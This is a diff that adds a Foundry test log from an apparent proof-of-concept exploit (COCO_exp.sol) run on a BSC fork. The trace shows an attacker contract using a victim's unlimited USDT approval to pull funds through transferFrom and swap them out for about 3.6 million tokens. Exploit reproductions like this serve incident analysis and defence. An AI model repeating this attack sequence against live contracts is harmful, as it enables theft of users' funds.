@@ -1,0 +1,68 @@
+No files changed, compilation skipped
+
+Ran 1 test for test/COCO_exp.sol:ContractTest
+[PASS] testPoC() (gas: 361512)
+Logs:
+  after attack: balance of address(attC): 3602727.568967624235381855
+
+Traces:
+  [3644] ContractTest::setUp()
+    ├─ [0] VM::createSelectFork("bsc", 41529776 [4.152e7])
+    │   └─ ← [Return] 0
+    └─ ← [Stop]
+
+  [364312] ContractTest::testPoC()
+    ├─ [0] VM::startPrank(0x0cc28b80D21eBe7b3f3320FAA059f163E98A55a2, 0x0cc28b80D21eBe7b3f3320FAA059f163E98A55a2)
+    │   └─ ← [Return]
+    ├─ [195036] → new AttackerC@0x26d76908F85b237c547C04c6636475CBd349AB06
+    │   └─ ← [Return] 974 bytes of code
+    ├─ [0] VM::stopPrank()
+    │   └─ ← [Return]
+    ├─ [0] VM::startPrank(0x51057dB447A6834c8FC4E9541db9c04304eF81D7)
+    │   └─ ← [Return]
+    ├─ [24562] 0x55d398326f99059fF775485246999027B3197955::approve(AttackerC: [0x26d76908F85b237c547C04c6636475CBd349AB06], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   ├─ emit Approval(owner: 0x51057dB447A6834c8FC4E9541db9c04304eF81D7, spender: AttackerC: [0x26d76908F85b237c547C04c6636475CBd349AB06], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   ├─  storage changes:
+    │   │   @ 0x240ff1bcaa418ec17d6bf1d6e219ba545224d2a1d05d82d3f15a45be09ad3515: 0 → 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+    │   └─ ← [Return] true
+    ├─ [0] VM::stopPrank()
+    │   └─ ← [Return]
+    ├─ [0] VM::startPrank(0x0cc28b80D21eBe7b3f3320FAA059f163E98A55a2, 0x0cc28b80D21eBe7b3f3320FAA059f163E98A55a2)
+    │   └─ ← [Return]
+    ├─ [98981] AttackerC::attack()
+    │   ├─ [15634] 0x55d398326f99059fF775485246999027B3197955::transferFrom(0x51057dB447A6834c8FC4E9541db9c04304eF81D7, 0xF31cb18759FE8356348c81268b859d2a32bf2117, 2212640000000000000000 [2.212e21])
+    │   │   ├─ emit Transfer(from: 0x51057dB447A6834c8FC4E9541db9c04304eF81D7, to: 0xF31cb18759FE8356348c81268b859d2a32bf2117, value: 2212640000000000000000 [2.212e21])
+    │   │   ├─ emit Approval(owner: 0x51057dB447A6834c8FC4E9541db9c04304eF81D7, spender: AttackerC: [0x26d76908F85b237c547C04c6636475CBd349AB06], value: 115792089237316195423570985008687907853269984665640564037244944007913129639935 [1.157e77])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0xd9aa65446459d2aec27f4ed2cef358227754fa0a505b2cf90cd8949572dd39ef: 0x000000000000000000000000000000000000000000006765cfef67bf22cef61e → 0x0000000000000000000000000000000000000000000067ddc27bccad6f1ef61e
+    │   │   │   @ 0x7ff68bcf471cba76045e6cb426c58b9e850904c395d0e5555c42bfc58ca4dd2e: 0x0000000000000000000000000000000000000000000086cc49d6dcd9005a914c → 0x000000000000000000000000000000000000000000008654574a77eab40a914c
+    │   │   │   @ 0x240ff1bcaa418ec17d6bf1d6e219ba545224d2a1d05d82d3f15a45be09ad3515: 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff → 0xffffffffffffffffffffffffffffffffffffffffffffff880d739b11b3afffff
+    │   │   └─ ← [Return] true
+    │   ├─ [78483] 0xF31cb18759FE8356348c81268b859d2a32bf2117::swap(0, 3639118756532953773112984 [3.639e24], AttackerC: [0x26d76908F85b237c547C04c6636475CBd349AB06], 0x)
+    │   │   ├─ [49694] 0xF563E86e461dE100CfCfD8b65dAA542d3d4B0550::transfer(AttackerC: [0x26d76908F85b237c547C04c6636475CBd349AB06], 3639118756532953773112984 [3.639e24])
+    │   │   │   ├─ emit Transfer(from: 0xF31cb18759FE8356348c81268b859d2a32bf2117, to: 0x16f5506e774D309292E9095092aed4c2869d5e84, value: 36391187565329537731129 [3.639e22])
+    │   │   │   ├─ emit Transfer(from: 0xF31cb18759FE8356348c81268b859d2a32bf2117, to: AttackerC: [0x26d76908F85b237c547C04c6636475CBd349AB06], value: 3602727568967624235381855 [3.602e24])
+    │   │   │   ├─ emit FeeLog(param0: 0xF31cb18759FE8356348c81268b859d2a32bf2117, param1: AttackerC: [0x26d76908F85b237c547C04c6636475CBd349AB06], param2: 36391187565329537731129 [3.639e22])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x02d1a1fbf4b609abe22130138c3c22ffe51ddb1c8ffcfe765b1e8547b894d523: 0 → 0x00000000000000000000000000000000000000000002fae840bb4350ef7b745f
+    │   │   │   │   @ 0x4c25799340c7c8a558fa9cc757314becae44ac10f65e2bf93fe9c8e080e01dec: 0x0000000000000000000000000000000000000000029cf68c4e26d5dd70a14953 → 0x00000000000000000000000000000000000000000299f3ef483db8a821a34abb
+    │   │   │   │   @ 0x63d59ee3aab836afe478e2179017f11ac3d75b2c041d6a813cd0911e383e6aa0: 0x0000000000000000000000000000000000000000007a5eb21bd27b5ac11baae9 → 0x0000000000000000000000000000000000000000007a6666e100553f209e3522
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0xF31cb18759FE8356348c81268b859d2a32bf2117) [staticcall]
+    │   │   │   └─ ← [Return] 490494492195574027056670 [4.904e23]
+    │   │   ├─ [930] 0xF563E86e461dE100CfCfD8b65dAA542d3d4B0550::balanceOf(0xF31cb18759FE8356348c81268b859d2a32bf2117) [staticcall]
+    │   │   │   └─ ← [Return] 805087619076419118117898939 [8.05e26]
+    │   │   ├─ emit Sync(reserve0: 490494492195574027056670 [4.904e23], reserve1: 805087619076419118117898939 [8.05e26])
+    │   │   ├─ emit Swap(sender: AttackerC: [0x26d76908F85b237c547C04c6636475CBd349AB06], amount0In: 2212640000000000000000 [2.212e21], amount1In: 0, amount0Out: 0, amount1Out: 3639118756532953773112984 [3.639e24], to: AttackerC: [0x26d76908F85b237c547C04c6636475CBd349AB06])
+    │   │   ├─  storage changes:
+    │   │   │   @ 8: 0x66c49acb0000029cf68c4e26d5dd70a14953000000006765cfef67bf22cef61e → 0x66c49acb00000299f3ef483db8a821a34abb0000000067ddc27bccad6f1ef61e
+    │   │   └─ ← [Stop]
+    │   └─ ← [Stop]
+    ├─ [930] 0xF563E86e461dE100CfCfD8b65dAA542d3d4B0550::balanceOf(AttackerC: [0x26d76908F85b237c547C04c6636475CBd349AB06]) [staticcall]
+    │   └─ ← [Return] 3602727568967624235381855 [3.602e24]
+    ├─ emit log_named_decimal_uint(key: "after attack: balance of address(attC)", val: 3602727568967624235381855 [3.602e24], decimals: 18)
+    └─ ← [Stop]
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 5.58s (4.73s CPU time)
+
+Ran 1 test suite in 8.23s (5.58s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
